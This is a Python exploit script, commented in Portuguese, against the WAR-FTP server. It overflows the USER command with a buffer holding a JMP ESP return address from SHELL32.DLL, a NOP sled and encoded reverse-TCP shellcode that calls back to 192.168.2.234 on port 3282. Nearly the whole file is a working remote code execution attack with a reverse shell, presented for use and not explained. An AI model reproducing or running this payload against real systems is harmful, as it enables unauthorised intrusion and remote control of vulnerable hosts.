#Exploit para WAR-FTP
#Escrito por: Ivan S. Vargas
#Data: 03/2017
#Descricao:
#O exploit gera um Buffer Overflow no comando USER,
#enviando um shellcode de conexao reversa.
import socket

SERVER = "127.0.0.1"
PORT = 21

#shellcode tcp revero para 192.168.2.234:3282 
#badchars: "\x00\x0d\x0a\x20\x40"
buf =  ""
buf += "\xd9\xcc\xd9\x74\x24\xf4\xb8\xe1\xe7\x92\xbd\x5f\x33"
buf += "\xc9\xb1\x52\x83\xc7\x04\x31\x47\x13\x03\xa6\xf4\x70"
buf += "\x48\xd4\x13\xf6\xb3\x24\xe4\x97\x3a\xc1\xd5\x97\x59"
buf += "\x82\x46\x28\x29\xc6\x6a\xc3\x7f\xf2\xf9\xa1\x57\xf5"
buf += "\x4a\x0f\x8e\x38\x4a\x3c\xf2\x5b\xc8\x3f\x27\xbb\xf1"
buf += "\x8f\x3a\xba\x36\xed\xb7\xee\xef\x79\x65\x1e\x9b\x34"
buf += "\xb6\x95\xd7\xd9\xbe\x4a\xaf\xd8\xef\xdd\xbb\x82\x2f"
buf += "\xdc\x68\xbf\x79\xc6\x6d\xfa\x30\x7d\x45\x70\xc3\x57"
buf += "\x97\x79\x68\x96\x17\x88\x70\xdf\x90\x73\x07\x29\xe3"
buf += "\x0e\x10\xee\x99\xd4\x95\xf4\x3a\x9e\x0e\xd0\xbb\x73"
buf += "\xc8\x93\xb0\x38\x9e\xfb\xd4\xbf\x73\x70\xe0\x34\x72"
buf += "\x56\x60\x0e\x51\x72\x28\xd4\xf8\x23\x94\xbb\x05\x33"
buf += "\x77\x63\xa0\x38\x9a\x70\xd9\x63\xf3\xb5\xd0\x9b\x03"
buf += "\xd2\x63\xe8\x31\x7d\xd8\x66\x7a\xf6\xc6\x71\x7d\x2d"
buf += "\xbe\xed\x80\xce\xbf\x24\x47\x9a\xef\x5e\x6e\xa3\x7b"
buf += "\x9e\x8f\x76\x2b\xce\x3f\x29\x8c\xbe\xff\x99\x64\xd4"
buf += "\x0f\xc5\x95\xd7\xc5\x6e\x3f\x22\x8e\x50\x68\x2e\xa4"
buf += "\x39\x6b\x2e\x34\x68\xe2\xc8\x2e\x9c\xa3\x43\xc7\x05"
buf += "\xee\x1f\x76\xc9\x24\x5a\xb8\x41\xcb\x9b\x77\xa2\xa6"
buf += "\x8f\xe0\x42\xfd\xed\xa7\x5d\x2b\x99\x24\xcf\xb0\x59"
buf += "\x22\xec\x6e\x0e\x63\xc2\x66\xda\x99\x7d\xd1\xf8\x63"
buf += "\x1b\x1a\xb8\xbf\xd8\xa5\x41\x4d\x64\x82\x51\x8b\x65"
buf += "\x8e\x05\x43\x30\x58\xf3\x25\xea\x2a\xad\xff\x41\xe5"
buf += "\x39\x79\xaa\x36\x3f\x86\xe7\xc0\xdf\x37\x5e\x95\xe0"
buf += "\xf8\x36\x11\x99\xe4\xa6\xde\x70\xad\xd7\x94\xd8\x84"
buf += "\x7f\x71\x89\x94\x1d\x82\x64\xda\x1b\x01\x8c\xa3\xdf"
buf += "\x19\xe5\xa6\xa4\x9d\x16\xdb\xb5\x4b\x18\x48\xb5\x59"

#JMP ESP no endereco 7CA58265 de SHELL32.DLL (informamos ao contrario no shellcode)
buffer = "A" * 485 + "\x65\x82\xa5\x7c" + "\x90" * (485 + 4 - len(buf)) + buf 

print "[+] Conectando ao servidor..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER,PORT))
r=s.recv(1024)
print r

print "[+] Enviando payload..."
s.send("USER "+buffer+"\r\n")
r=s.recv(1024)

print "[*] Retorno: " % r
